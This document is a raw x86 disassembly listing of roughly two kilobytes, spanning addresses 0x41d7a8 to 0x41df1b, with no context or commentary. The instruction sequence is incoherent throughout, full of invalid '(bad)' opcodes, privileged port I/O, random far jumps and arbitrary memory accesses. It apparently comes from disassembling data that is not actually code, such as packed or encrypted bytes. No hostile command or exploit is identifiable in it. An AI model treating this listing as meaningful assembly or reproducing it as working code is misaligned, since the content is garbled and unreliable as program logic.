  41d7a8:	sbb    BYTE PTR [bx+si+0x518d],0x4f
  41d7ae:	out    dx,eax
  41d7af:	and    DWORD PTR [esi-0x32cd94a4],ebx
  41d7b5:	inc    edi
  41d7b6:	mov    al,ds:0x1e17cea2
  41d7bb:	pusha  
  41d7bc:	jmp    0x41d7e1
  41d7be:	push   0x60
  41d7c0:	or     DWORD PTR [esi+0x5f],ebp
  41d7c3:	sbb    DWORD PTR [esi-0x2ef7c50d],edi
  41d7c9:	aam    0x4e
  41d7cb:	sahf   
  41d7cc:	mov    DWORD PTR [eax+0x4554ff7a],ebp
  41d7d2:	push   ecx
  41d7d3:	sbb    ebp,DWORD PTR [edi+0x4e49343f]
  41d7d9:	sti    
  41d7da:	dec    eax
  41d7db:	outs   dx,DWORD PTR ds:[esi]
  41d7dc:	jae    0x41d76d
  41d7de:	push   eax
  41d7df:	push   edx
  41d7e0:	fdivr  QWORD PTR [edx-0x40c6bd99]
  41d7e6:	cmp    edx,DWORD PTR [ebx+0x19]
  41d7e9:	scas   al,BYTE PTR es:[edi]
  41d7ea:	dec    eax
  41d7eb:	cmp    ch,bl
  41d7ed:	sub    ch,bh
  41d7ef:	stos   DWORD PTR es:[edi],eax
  41d7f0:	dec    eax
  41d7f1:	cmp    edi,DWORD PTR [edi+0x59d154fc]
  41d7f7:	test   BYTE PTR es:[edi+0xe0534d5],dh
  41d7fe:	loop   0x41d780
  41d800:	fnstcw WORD PTR [ebp+0x59f1e770]
  41d806:	sbb    DWORD PTR [edx+esi*2],ebx
  41d809:	push   eax
  41d80a:	dec    edi
  41d80b:	mov    eax,ds:0x6efefa86
  41d810:	femms  
  41d812:	sub    BYTE PTR [edi-0x50be0ba2],bl
  41d818:	ds out 0xa2,eax
  41d81b:	rol    DWORD PTR [ebx+0xfe8c1b4],1
  41d821:	mov    dl,BYTE PTR [ecx+0x265774e1]
  41d827:	pop    ds
  41d828:	enter  0xac46,0xaf
  41d82c:	xchg   esi,eax
  41d82d:	repnz imul edi,DWORD PTR [ecx+0x29210624],0x67
  41d835:	mov    al,ds:0x7f4f900f
  41d83a:	cs ds mov dl,0x76
  41d83e:	ret    0xb8cb
  41d841:	ds dec esp
  41d843:	enter  0x17a7,0x2b
  41d847:	cwde   
  41d848:	sub    esi,esp
  41d84a:	pop    ebx
  41d84b:	cmp    DWORD PTR [edi],0xffffffd1
  41d84e:	adc    eax,0xaff1c494
  41d853:	pop    ebp
  41d854:	jb     0x41d823
  41d856:	mov    DWORD PTR [edx+0x3a0f44a6],eax
  41d85c:	xor    eax,eax
  41d85e:	outs   dx,BYTE PTR ds:[esi]
  41d85f:	or     al,0x9f
  41d861:	cmp    al,al
  41d863:	or     dl,dl
  41d865:	int3   
  41d866:	adc    al,0x90
  41d868:	mov    WORD PTR [ebx+0x445d0a8c],ss
  41d86e:	xchg   edi,eax
  41d86f:	(bad)  
  41d870:	dec    esp
  41d871:	mov    gs:0x47fad84a,al
  41d877:	push   ebp
  41d878:	add    DWORD PTR [eax-0x6991fb8c],0x74
  41d87f:	mov    bh,0x4e
  41d881:	jmp    0xe258:0xdad9e790
  41d888:	je     0x41d80e
  41d88a:	in     eax,dx
  41d88b:	scas   al,BYTE PTR es:[edi]
  41d88c:	mov    WORD PTR [eax-0x2d],gs
  41d88f:	jae    0x41d83b
  41d891:	das    
  41d892:	(bad)  
  41d893:	jp     0x41d86f
  41d895:	sahf   
  41d896:	mov    WORD PTR [ebp-0x4d],cs
  41d899:	push   esp
  41d89a:	fsubr  QWORD PTR [ebp+0xd6acd5e]
  41d8a0:	loop   0x41d85b
  41d8a2:	ds inc esi
  41d8a4:	jecxz  0x41d8ce
  41d8a6:	mov    bl,0xeb
  41d8a8:	jge    0x41d904
  41d8aa:	dec    ebx
  41d8ab:	js     0x41d8d0
  41d8ad:	push   edx
  41d8ae:	mov    ds:0xec94e05a,eax
  41d8b3:	lock out dx,al
  41d8b5:	mov    bh,bh
  41d8b7:	or     al,0xe7
  41d8b9:	push   edx
  41d8ba:	push   ebp
  41d8bb:	ret    
  41d8bc:	test   BYTE PTR [ebx+0x4955d998],0x1a
  41d8c3:	out    dx,eax
  41d8c4:	(bad)  
  41d8c6:	push   esi
  41d8c7:	sti    
  41d8c8:	outs   dx,BYTE PTR ds:[esi]
  41d8c9:	pusha  
  41d8ca:	leave  
  41d8cb:	xchg   edi,eax
  41d8cc:	xchg   edi,eax
  41d8cd:	cmp    edi,DWORD PTR [edx]
  41d8cf:	lahf   
  41d8d0:	mov    ds:0xe7d99250,al
  41d8d5:	dec    ebx
  41d8d6:	add    esi,ecx
  41d8d8:	mov    cl,bh
  41d8da:	das    
  41d8db:	pop    eax
  41d8dc:	xchg   ebx,eax
  41d8dd:	fsqrt  
  41d8df:	outs   dx,BYTE PTR ds:[esi]
  41d8e0:	mov    BYTE PTR [ebp+0x74ffd340],al
  41d8e6:	cmp    BYTE PTR [esi],cl
  41d8e8:	or     ch,BYTE PTR [ecx-0xd]
  41d8eb:	out    dx,al
  41d8ec:	push   es
  41d8ed:	mov    ecx,0xa2fd0248
  41d8f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8f3:	sbb    eax,0x220d098b
  41d8f8:	or     BYTE PTR es:[eax],dh
  41d8fb:	push   es
  41d8fc:	fst    DWORD PTR [ebx]
  41d8fe:	enter  0x8bba,0xf9
  41d902:	jp     0x41d972
  41d904:	xor    DWORD PTR [eax+0x74],esp
  41d907:	ds mov ebx,0x8496ffc2
  41d90d:	pop    eax
  41d90e:	xor    eax,0x6ffb5b4e
  41d913:	and    BYTE PTR [ebx],ah
  41d915:	push   eax
  41d916:	pop    esi
  41d917:	sub    ebp,DWORD PTR [esi-0x332178b7]
  41d91d:	lock inc ecx
  41d91f:	jl     0x41d8c6
  41d921:	and    BYTE PTR [ecx+0x74bee088],dl
  41d927:	fisubr DWORD PTR [edi-0x7b]
  41d92a:	scas   al,BYTE PTR es:[edi]
  41d92b:	icebp  
  41d92c:	mov    BYTE PTR [ebx+0x69673f97],dl
  41d932:	retf   
  41d933:	outs   dx,BYTE PTR ds:[esi]
  41d934:	mov    dl,0x37
  41d936:	xchg   DWORD PTR [ecx+0x9],eax
  41d939:	push   eax
  41d93a:	aam    0xfc
  41d93c:	and    ebx,esp
  41d93e:	cmp    ebp,DWORD PTR [eax]
  41d940:	dec    esp
  41d941:	pop    esp
  41d942:	sbb    al,0xf6
  41d944:	add    DWORD PTR [eax-0x10],0xffffffce
  41d948:	inc    ecx
  41d949:	loop   0x41d94e
  41d94b:	fucomi st,st(6)
  41d94d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d94e:	jge    0x41d948
  41d950:	idiv   cl
  41d952:	test   eax,0x7cd7f0db
  41d957:	(bad)  
  41d958:	loop   0x41d964
  41d95a:	jge    0x41d8ec
  41d95c:	or     bh,BYTE PTR [edi-0x447b37a2]
  41d962:	xor    BYTE PTR [esi-0x2ad2cde2],0x4b
  41d969:	mov    ah,0x8f
  41d96b:	pusha  
  41d96c:	sub    BYTE PTR [ecx+0x2c],cl
  41d96f:	jno    0x41d938
  41d971:	cdq    
  41d972:	outs   dx,BYTE PTR ds:[esi]
  41d973:	xchg   ecx,eax
  41d974:	pop    ebx
  41d975:	loope  0x41d97d
  41d977:	test   al,0xb6
  41d979:	cmp    DWORD PTR [esi-0x7d183c71],ecx
  41d97f:	enter  0x3c19,0x82
  41d983:	gs stc 
  41d985:	ret    0xf480
  41d988:	and    al,0x57
  41d98a:	cs pop eax
  41d98c:	xchg   ebx,eax
  41d98d:	scas   al,BYTE PTR es:[edi]
  41d98e:	int    0x46
  41d990:	jmp    0x41d994
  41d992:	lea    esi,[esi+edx*8]
  41d995:	pop    ebx
  41d996:	ins    DWORD PTR es:[edi],dx
  41d997:	jmp    0x2799:0x1148b021
  41d99e:	arpl   WORD PTR [ecx],sp
  41d9a0:	clc    
  41d9a1:	in     eax,dx
  41d9a2:	ins    BYTE PTR es:[edi],dx
  41d9a3:	shl    DWORD PTR [edi],0xba
  41d9a6:	aas    
  41d9a7:	arpl   WORD PTR [eax+0x43a2eb7c],bp
  41d9ad:	sbb    eax,0x8db55a79
  41d9b2:	mov    ds:0x737d60aa,eax
  41d9b7:	mov    bl,0xe0
  41d9b9:	repnz in al,dx
  41d9bb:	into   
  41d9bc:	adc    dh,BYTE PTR [edx]
  41d9be:	pop    edx
  41d9bf:	out    dx,eax
  41d9c0:	pop    edi
  41d9c1:	repz jne 0x41da2a
  41d9c4:	div    ah
  41d9c6:	and    edx,ecx
  41d9c8:	mov    esp,0x958e8762
  41d9cd:	lds    ebx,FWORD PTR [esi]
  41d9cf:	mov    edx,0x2cb6c2c0
  41d9d4:	mov    esp,0xd9de119d
  41d9d9:	add    eax,0x48bfcedf
  41d9de:	add    BYTE PTR [ebx-0x78],0x89
  41d9e2:	jno    0x41d9a6
  41d9e4:	test   eax,0xae965905
  41d9e9:	sbb    bl,ch
  41d9eb:	dec    edi
  41d9ec:	addr16 jmp 0xab46:0xd53486e4
  41d9f4:	sbb    ebx,DWORD PTR [ebx+edx*8-0x62]
  41d9f8:	cmp    al,BYTE PTR [ebx]
  41d9fa:	push   ds
  41d9fb:	push   ecx
  41d9fc:	push   ecx
  41d9fd:	jle    0x41da58
  41d9ff:	shl    BYTE PTR [esp+ebx*1],1
  41da02:	jp     0x41d989
  41da04:	xchg   DWORD PTR [ebx-0x60],esi
  41da07:	mov    bl,0x58
  41da09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da0a:	sbb    DWORD PTR [esi],ecx
  41da0c:	adc    al,0x30
  41da0e:	loop   0x41d9b3
  41da10:	mov    ebx,0x9013fb17
  41da15:	popa   
  41da16:	call   0xa6a1d20e
  41da1b:	arpl   WORD PTR [edi-0x37],ax
  41da1e:	cmp    ah,BYTE PTR [edi+0x700768b2]
  41da24:	imul   eax,DWORD PTR [ecx-0x19fc332],0xa5ab2a81
  41da2e:	outs   dx,DWORD PTR ds:[esi]
  41da2f:	and    al,0x4d
  41da31:	dec    ebx
  41da32:	xor    al,0x39
  41da34:	inc    ebx
  41da35:	fs je  0x41d9f4
  41da38:	and    al,0xf1
  41da3a:	pop    ebp
  41da3b:	pop    esp
  41da3d:	mov    esp,0xd20f33b8
  41da42:	inc    esp
  41da43:	mov    cl,0xf2
  41da45:	pop    ebp
  41da46:	test   eax,0xd402000f
  41da4b:	mov    esi,0x48fc998c
  41da50:	pop    edx
  41da51:	add    eax,0xbc21d078
  41da56:	inc    esp
  41da57:	cdq    
  41da58:	nop
  41da59:	xchg   ebx,eax
  41da5a:	add    ebp,DWORD PTR [edx]
  41da5c:	mov    eax,ds:0xce67f2c
  41da61:	inc    edx
  41da62:	ret    
  41da63:	sub    esp,DWORD PTR [ecx+0x35]
  41da66:	enter  0x2ce2,0x70
  41da6a:	mov    eax,es:0x2758b3de
  41da70:	fisttp DWORD PTR [ecx]
  41da72:	call   0x66ab408f
  41da77:	mov    eax,0xcf3fb8c7
  41da7c:	jp     0x41dab9
  41da7e:	sbb    eax,0x111e96d3
  41da83:	and    eax,0x5fc2749b
  41da88:	sbb    ch,BYTE PTR ds:0x19128bb6
  41da8e:	mov    ebx,DWORD PTR [esi+0x60af088a]
  41da94:	dec    edx
  41da95:	out    dx,al
  41da96:	mov    dh,0x8b
  41da98:	out    0x4c,al
  41da9a:	std    
  41da9b:	mov    ebx,0x89379fad
  41daa0:	inc    eax
  41daa1:	enter  0x57e,0x6a
  41daa5:	sbb    BYTE PTR [eax+edi*4+0x1dda55c1],0x4e
  41daad:	stos   BYTE PTR es:[di],al
  41daaf:	into   
  41dab0:	push   edx
  41dab1:	dec    eax
  41dab2:	jne    0x41da97
  41dab4:	and    al,0x3f
  41dab6:	mov    edx,0xf12410a4
  41dabb:	(bad)  
  41dabd:	xchg   DWORD PTR [edi+0x78],ecx
  41dac0:	leave  
  41dac1:	sbb    DWORD PTR cs:[ebx+0x6311694d],ebx
  41dac8:	push   cs
  41dac9:	lds    ebx,FWORD PTR [edi]
  41dacb:	add    bl,dh
  41dacd:	in     eax,0x26
  41dacf:	push   0x942621dc
  41dad4:	mov    dh,BYTE PTR [ebx]
  41dad6:	jne    0x41da6c
  41dad8:	lds    eax,FWORD PTR [eax+0x40]
  41dadb:	or     al,0x30
  41dadd:	cmp    dh,dh
  41dadf:	or     eax,DWORD PTR [edi]
  41dae1:	(bad)  
  41dae2:	repz mov dh,0x6
  41dae5:	aas    
  41dae6:	jmp    0x41dab6
  41dae8:	xor    al,0x3a
  41daea:	mov    WORD PTR [esi+0x68a1daa4],fs
  41daf0:	aam    0x49
  41daf2:	int3   
  41daf3:	adc    esi,DWORD PTR [esi-0x34]
  41daf6:	into   
  41daf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daf8:	cmc    
  41daf9:	mov    ah,0x76
  41dafb:	repz fwait
  41dafd:	add    al,0x3c
  41daff:	imul   esi,DWORD PTR [ecx],0xfffffffe
  41db02:	jae    0x41db6b
  41db04:	push   0xe40ab58e
  41db09:	sub    esp,DWORD PTR [ebx-0x75e4cae]
  41db0f:	lods   eax,DWORD PTR ds:[esi]
  41db10:	dec    eax
  41db11:	cmc    
  41db12:	inc    ecx
  41db13:	scas   eax,DWORD PTR es:[edi]
  41db14:	sbb    BYTE PTR [edi-0x561f70ab],bl
  41db1a:	jge    0x41dab9
  41db1c:	dec    BYTE PTR [edi+0x4b28b9e7]
  41db22:	aas    
  41db23:	loopne 0x41db5b
  41db25:	in     al,0xf6
  41db27:	sbb    DWORD PTR [eax+0xf],ecx
  41db2a:	call   0x11a:0x50c9a3e7
  41db31:	pop    ds
  41db32:	sub    BYTE PTR [edx-0x1deecbf3],bh
  41db38:	test   eax,0x4bb671db
  41db3d:	inc    esp
  41db3e:	pop    esi
  41db3f:	sbb    cl,bl
  41db41:	fisub  DWORD PTR [eax+0x5ee1476a]
  41db47:	iret   
  41db48:	fsub   QWORD PTR [edi+0x60]
  41db4b:	sahf   
  41db4c:	ret    0xb316
  41db4f:	xchg   ecx,eax
  41db50:	clc    
  41db51:	inc    edx
  41db52:	clc    
  41db53:	(bad)  
  41db54:	in     al,0x18
  41db56:	xchg   ecx,eax
  41db57:	and    esp,0xffffff84
  41db5a:	(bad)  
  41db5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db5c:	out    0x85,eax
  41db5e:	pop    edx
  41db5f:	sahf   
  41db60:	mov    eax,ds:0x8828370e
  41db65:	xor    ecx,esi
  41db67:	add    cl,BYTE PTR ds:0xf36f985
  41db6d:	fidivr DWORD PTR [ebx]
  41db6f:	and    ebx,DWORD PTR [esi-0x38]
  41db72:	pop    ebp
  41db73:	dec    ebx
  41db74:	mov    fs,esp
  41db76:	lods   eax,DWORD PTR ds:[esi]
  41db77:	fistp  QWORD PTR [ebp+0x44]
  41db7a:	leave  
  41db7b:	pop    ds
  41db7c:	cwde   
  41db7d:	sub    ah,dl
  41db7f:	push   edi
  41db80:	data16 in al,0xf1
  41db83:	jns    0x41dbe9
  41db85:	popa   
  41db86:	test   al,0x9b
  41db88:	dec    edx
  41db89:	in     al,0x84
  41db8b:	lods   eax,DWORD PTR fs:[esi]
  41db8d:	push   cs
  41db8e:	mov    dl,0x9
  41db90:	cmc    
  41db91:	in     al,0x54
  41db93:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db95:	repnz mov ds:0x7a345543,al
  41db9b:	imul   eax,DWORD PTR ds:0x4b5f56fa,0x2f
  41dba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dba3:	mov    fs,WORD PTR [edi-0x5051f09]
  41dba9:	jno    0x41dbfb
  41dbab:	repz or BYTE PTR [ecx-0x4187b5d4],ch
  41dbb2:	mov    bl,0x44
  41dbb4:	jb     0x41db7f
  41dbb6:	sub    eax,0x9718f620
  41dbbb:	push   esp
  41dbbc:	out    0x6a,al
  41dbbe:	xchg   edi,eax
  41dbbf:	repnz cmp al,0x9b
  41dbc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbc3:	mov    ecx,ebp
  41dbc5:	xor    DWORD PTR ds:0xd93df77c,edx
  41dbcb:	jmp    0x41db69
  41dbcd:	out    0x38,al
  41dbcf:	ss icebp 
  41dbd1:	dec    edi
  41dbd2:	das    
  41dbd3:	adc    bl,BYTE PTR [ecx-0x15]
  41dbd6:	or     esp,DWORD PTR [edx-0x3d3663bb]
  41dbdc:	adc    DWORD PTR [ecx],eax
  41dbde:	push   ebp
  41dbdf:	pop    ds
  41dbe0:	idiv   DWORD PTR [edx-0x6918cbda]
  41dbe6:	hlt    
  41dbe7:	int    0x77
  41dbe9:	shl    DWORD PTR [eax+edx*4+0x7],0x7d
  41dbee:	into   
  41dbef:	mov    eax,ds:0xe2a27aef
  41dbf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbf5:	xchg   edi,eax
  41dbf6:	popf   
  41dbf7:	cs popa 
  41dbf9:	mov    bl,0x86
  41dbfb:	and    BYTE PTR [ebx+0xd98f614],bh
  41dc01:	cmp    ah,al
  41dc03:	push   ecx
  41dc04:	jmp    0x79ffa7c1
  41dc09:	pop    esi
  41dc0a:	imul   eax,DWORD PTR [esi+esi*2],0xf6d6350b
  41dc11:	imul   ebp,DWORD PTR [esi],0xfffffff7
  41dc14:	or     al,0xa0
  41dc16:	sbb    cl,BYTE PTR [eax-0x11]
  41dc19:	pop    esp
  41dc1a:	out    dx,eax
  41dc1b:	lea    eax,[edi]
  41dc1d:	jle    0x41dbed
  41dc1f:	mov    eax,0x38c2d838
  41dc24:	inc    ecx
  41dc25:	test   DWORD PTR [ecx-0x3d],edi
  41dc28:	mov    ds:0x46d86bab,eax
  41dc2d:	ja     0x41dbbc
  41dc2f:	enter  0x2867,0xc
  41dc33:	xor    DWORD PTR ds:0x4b99a90e,edx
  41dc39:	and    eax,0xc9f7a4e1
  41dc3e:	adc    al,0x30
  41dc40:	cmp    al,0xb6
  41dc42:	sbb    eax,0x89bfca76
  41dc47:	inc    ebx
  41dc48:	into   
  41dc49:	cmp    ch,BYTE PTR [ebx-0x39]
  41dc4c:	jno    0x41dcb6
  41dc4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc4f:	(bad)  
  41dc50:	cmp    DWORD PTR [ebx+0x57],edx
  41dc53:	stos   DWORD PTR es:[edi],eax
  41dc54:	sub    edx,DWORD PTR [ebx+0x47e3207e]
  41dc5a:	ss mov bl,0x5
  41dc5d:	adc    BYTE PTR [eax-0x2d36b09a],ch
  41dc63:	stos   BYTE PTR es:[edi],al
  41dc64:	sbb    DWORD PTR [esi],ebx
  41dc66:	arpl   WORD PTR [ecx+ecx*4-0x7e],di
  41dc6a:	scas   al,BYTE PTR es:[edi]
  41dc6b:	or     edx,DWORD PTR [edx]
  41dc6d:	jnp    0x41dc08
  41dc6f:	push   edi
  41dc70:	and    dl,ah
  41dc72:	sbb    BYTE PTR [esp+ebx*1],cl
  41dc75:	dec    edx
  41dc76:	ret    0x95d
  41dc79:	add    al,0x5d
  41dc7b:	shr    esi,1
  41dc7d:	mov    ebp,ecx
  41dc7f:	xor    ebp,edi
  41dc81:	fwait
  41dc82:	pop    edx
  41dc83:	loop   0x41dcea
  41dc85:	std    
  41dc86:	fsubr  st(2),st
  41dc88:	and    al,0xb
  41dc8a:	leave  
  41dc8b:	xor    ch,BYTE PTR [ebx]
  41dc8d:	push   ds
  41dc8e:	jmp    0x5ee37f86
  41dc93:	sub    eax,esi
  41dc95:	or     edx,DWORD PTR [edi+eax*4+0x3]
  41dc99:	imul   DWORD PTR [esi-0x55]
  41dc9c:	ds (bad) 
  41dc9e:	pop    esi
  41dc9f:	inc    ebp
  41dca0:	xor    ecx,DWORD PTR [edi-0xa]
  41dca3:	dec    edi
  41dca4:	push   0x8c5fb088
  41dca9:	ja     0x41dd0c
  41dcab:	in     eax,0x99
  41dcad:	dec    edx
  41dcae:	repz pop ds
  41dcb0:	in     al,0x4f
  41dcb2:	repz aaa 
  41dcb4:	cwd    
  41dcb6:	(bad)  
  41dcb7:	frstor [edi+0x2e]
  41dcba:	clc    
  41dcbb:	add    bh,BYTE PTR [edx+esi*4-0x49]
  41dcbf:	stos   BYTE PTR es:[edi],al
  41dcc0:	adc    bl,BYTE PTR [esi+esi*8-0x1b]
  41dcc4:	push   0x19
  41dcc6:	(bad)  
  41dcc7:	imul   esi,DWORD PTR ds:0xcf6fbeaa,0xafd3b5f5
  41dcd1:	je     0x41dc58
  41dcd3:	sar    ebp,cl
  41dcd5:	stos   BYTE PTR es:[edi],al
  41dcd6:	sbb    bl,BYTE PTR [ebp+ebp*4+0x68acaf14]
  41dcdd:	popf   
  41dcde:	cs dec eax
  41dce0:	fstp   TBYTE PTR [ebp-0x21]
  41dce3:	jmp    DWORD PTR [edx+0x75]
  41dce6:	push   0xffffff8f
  41dce8:	js     0x41dd33
  41dcea:	retf   
  41dceb:	sub    eax,0xaed2ff1d
  41dcf0:	lods   al,BYTE PTR ds:[esi]
  41dcf1:	gs ret 0x74ca
  41dcf5:	(bad)  [esi-0x66588477]
  41dcfb:	push   esi
  41dcfc:	scas   eax,DWORD PTR es:[edi]
  41dcfd:	sub    dl,BYTE PTR [edx-0x5df1e6a2]
  41dd03:	mov    ebx,0x14164832
  41dd08:	in     al,dx
  41dd09:	dec    DWORD PTR [esi-0x52]
  41dd0c:	fimul  DWORD PTR [edx]
  41dd0e:	push   esp
  41dd0f:	or     al,0x99
  41dd11:	or     BYTE PTR [ebx-0x3e87bc74],al
  41dd17:	adc    cl,BYTE PTR [edi]
  41dd19:	pusha  
  41dd1a:	xlat   BYTE PTR ds:[ebx]
  41dd1b:	pusha  
  41dd1c:	or     DWORD PTR [edi-0x2f],ecx
  41dd1f:	sub    esi,DWORD PTR [ebp-0x7e]
  41dd22:	fchs   
  41dd24:	sub    al,0x35
  41dd26:	xchg   si,ax
  41dd28:	cmp    DWORD PTR [ecx+0x53],esi
  41dd2b:	sbb    dl,BYTE PTR [edi]
  41dd2d:	ins    DWORD PTR es:[edi],dx
  41dd2e:	jb     0x41dd44
  41dd30:	mov    WORD PTR ds:[ecx],?
  41dd33:	xchg   DWORD PTR [ebx-0xbdc42fa],ecx
  41dd39:	fnsave [esi+0xea90f5a]
  41dd3f:	pop    eax
  41dd40:	jne    0x41dd00
  41dd42:	(bad)  
  41dd43:	stc    
  41dd44:	or     DWORD PTR [ebp-0x6c4df67a],esi
  41dd4a:	or     cl,BYTE PTR [edx-0x5c]
  41dd4d:	je     0x41dd49
  41dd4f:	jmp    0x6b31291d
  41dd54:	(bad)
  41dd57:	add    ebp,edx
  41dd59:	push   ds
  41dd5a:	ins    DWORD PTR es:[edi],dx
  41dd5b:	icebp  
  41dd5c:	dec    esi
  41dd5d:	jle    0x41dd5f
  41dd5f:	push   ebp
  41dd60:	int3   
  41dd61:	dec    ecx
  41dd62:	push   0x3d
  41dd64:	mov    ecx,0xe1472320
  41dd69:	or     edx,ebp
  41dd6b:	stos   DWORD PTR es:[edi],eax
  41dd6c:	paddq  mm3,QWORD PTR [ecx+0x20]
  41dd70:	push   edi
  41dd71:	ds and al,0x8a
  41dd74:	out    0xe2,eax
  41dd76:	jbe    0x41dcfc
  41dd78:	and    ebx,ecx
  41dd7a:	out    dx,eax
  41dd7b:	rcr    BYTE PTR [edi],1
  41dd7d:	ror    edi,0x94
  41dd80:	and    edi,DWORD PTR [ebx]
  41dd82:	bnd jb 0x41ddba
  41dd85:	pop    es
  41dd86:	cs mov ecx,0x9501fc4e
  41dd8c:	out    dx,al
  41dd8d:	xchg   ebx,eax
  41dd8e:	sub    cl,BYTE PTR [ecx]
  41dd90:	scas   eax,DWORD PTR es:[edi]
  41dd91:	adc    eax,DWORD PTR [edi-0x7f0049c8]
  41dd97:	adc    BYTE PTR [eax-0x1a7267dd],dh
  41dd9d:	mov    al,0x86
  41dd9f:	cs push ebx
  41dda1:	jnp    0x41ddef
  41dda3:	and    ebx,DWORD PTR [ecx]
  41dda5:	or     cl,dl
  41dda7:	push   ebx
  41dda8:	ror    BYTE PTR [ebp-0x65a84280],cl
  41ddae:	int3   
  41ddaf:	mov    eax,0x104283b5
  41ddb4:	or     dh,BYTE PTR [eax-0x6b8602c6]
  41ddba:	mov    ecx,0x78f5e64
  41ddbf:	adc    esp,DWORD PTR [eax]
  41ddc1:	xchg   edi,eax
  41ddc2:	retf   0xe421
  41ddc5:	daa    
  41ddc6:	leave  
  41ddc7:	sub    DWORD PTR [edi+0x31],ebx
  41ddca:	xor    eax,DWORD PTR [edi-0xe]
  41ddcd:	aam    0x85
  41ddcf:	(bad)
  41ddd2:	xchg   edi,eax
  41ddd3:	lock nop
  41ddd5:	mov    cl,0x79
  41ddd7:	out    dx,al
  41ddd8:	rol    DWORD PTR [ebx+0x14cdcc63],1
  41ddde:	or     DWORD PTR [edx+0x2adae8cf],0x64a13fb8
  41dde8:	in     al,dx
  41dde9:	fadd   QWORD PTR [ecx]
  41ddeb:	jmp    0x9d91:0x53139fe0
  41ddf2:	mov    gs,WORD PTR [ebx]
  41ddf4:	es je  0x41ddd1
  41ddf7:	mov    ebx,0xeb20f978
  41ddfc:	rol    DWORD PTR [ebx-0x5f],cl
  41ddff:	enter  0x964e,0xb4
  41de03:	loope  0x41ddfa
  41de05:	test   DWORD PTR [ebx],ebp
  41de07:	or     DWORD PTR [esi-0x6853913e],ebx
  41de0d:	gs ret 
  41de0f:	jmp    0x6868:0x1b2a0414
  41de16:	adc    eax,esp
  41de18:	adc    BYTE PTR [edi+0x5ffddc68],0x78
  41de1f:	sub    ebp,DWORD PTR [edi]
  41de21:	jmp    0x41de4e
  41de23:	fcmovne st,st(4)
  41de25:	push   ebx
  41de26:	adc    edi,DWORD PTR ds:0xe795c914
  41de2c:	or     dh,BYTE PTR [ebp+0x41]
  41de2f:	imul   esp,DWORD PTR [ebx+0x4c],0xe31f4eac
  41de36:	cmp    DWORD PTR ds:0x8e8562db,0x66
  41de3d:	out    dx,al
  41de3e:	std    
  41de3f:	dec    ebx
  41de40:	js     0x41de46
  41de42:	fdiv   QWORD PTR [ebx]
  41de44:	pop    edx
  41de45:	out    dx,al
  41de46:	inc    edx
  41de47:	push   esp
  41de48:	mov    esp,0x6da682d0
  41de4d:	jg     0x41ddf3
  41de4f:	loope  0x41ded0
  41de51:	leave  
  41de52:	or     ebx,DWORD PTR [ecx+0xea90c19]
  41de58:	xor    ecx,0x4f8ef5d0
  41de5e:	xchg   ebx,eax
  41de5f:	jns    0x41dea0
  41de61:	(bad)  
  41de62:	popa   
  41de63:	scas   al,BYTE PTR es:[edi]
  41de64:	fwait
  41de65:	push   esi
  41de66:	cmc    
  41de67:	or     esi,DWORD PTR [edi+eax*4-0x14]
  41de6b:	fcom   DWORD PTR [ecx+0x26]
  41de6e:	dec    eax
  41de6f:	loope  0x41de6b
  41de71:	in     al,dx
  41de72:	dec    edi
  41de73:	repz inc edx
  41de75:	test   DWORD PTR [esi+0x702ef23a],ebx
  41de7b:	push   esp
  41de7c:	fcom   DWORD PTR ds:0x3fc82139
  41de82:	add    DWORD PTR [ebx+eiz*2],eax
  41de85:	clc    
  41de86:	xor    DWORD PTR [esi+0x56],esi
  41de89:	clc    
  41de8a:	popf   
  41de8b:	into   
  41de8c:	jg     0x41de43
  41de8e:	repz ja 0x41de8b
  41de91:	and    ah,BYTE PTR [ebx]
  41de93:	push   cs
  41de94:	add    eax,0x6d63b80
  41de99:	xchg   esp,eax
  41de9a:	in     eax,0x23
  41de9c:	mov    ds:0x25d4331f,al
  41dea1:	xchg   DWORD PTR [eax+0x33d89f5f],edi
  41dea7:	aaa    
  41dea8:	xor    BYTE PTR [eax-0x52e78c8f],0xa4
  41deaf:	popf   
  41deb0:	sbb    ecx,DWORD PTR [edi]
  41deb2:	mov    WORD PTR [ebp-0x1912d63d],cs
  41deb8:	aad    0xc2
  41deba:	mov    eax,ds:0xb2b59042
  41debf:	pop    edi
  41dec0:	pop    ss
  41dec1:	outs   dx,DWORD PTR ds:[esi]
  41dec2:	push   edx
  41dec3:	cdq    
  41dec4:	lock scas al,BYTE PTR es:[edi]
  41dec6:	pushf  
  41dec7:	test   BYTE PTR [edi-0x6f],dh
  41deca:	not    DWORD PTR [edi]
  41decc:	fistp  WORD PTR [ecx]
  41dece:	jns    0x41de7c
  41ded0:	mov    dh,0x40
  41ded2:	dec    ecx
  41ded3:	cdq    
  41ded4:	mov    DWORD PTR [edi-0x1d],esp
  41ded7:	fist   WORD PTR [edx+0x5ffba471]
  41dedd:	call   0xc22176ff
  41dee2:	xor    DWORD PTR [edi],ecx
  41dee4:	fwait
  41dee5:	arpl   WORD PTR [edx],dx
  41dee7:	dec    edi
  41dee8:	mov    ch,0x4b
  41deea:	ja     0x41def2
  41deec:	adc    BYTE PTR [esi],0x38
  41deef:	(bad)  
  41def0:	fiadd  WORD PTR [ebp+0x282c379d]
  41def6:	fwait
  41def7:	stc    
  41def8:	gs leave 
  41defa:	add    BYTE PTR [eax],0x1c
  41defd:	sbb    ah,BYTE PTR [ecx-0x4a]
  41df00:	jo     0x41df4b
  41df02:	stos   DWORD PTR es:[edi],eax
  41df03:	adc    edx,DWORD PTR [ebx]
  41df05:	mov    ds:0x3a83a5be,al
  41df0a:	out    dx,al
  41df0b:	repz loop 0x41df28
  41df0e:	stc    
  41df0f:	in     eax,0x5e
  41df11:	mov    ds,ebp
  41df13:	dec    ebp
  41df14:	dec    esp
  41df15:	xor    BYTE PTR [esi+0x5f],0x2d
  41df19:	sbb    ebx,esp
  41df1b:	rcr    DWORD PTR [ebx],1
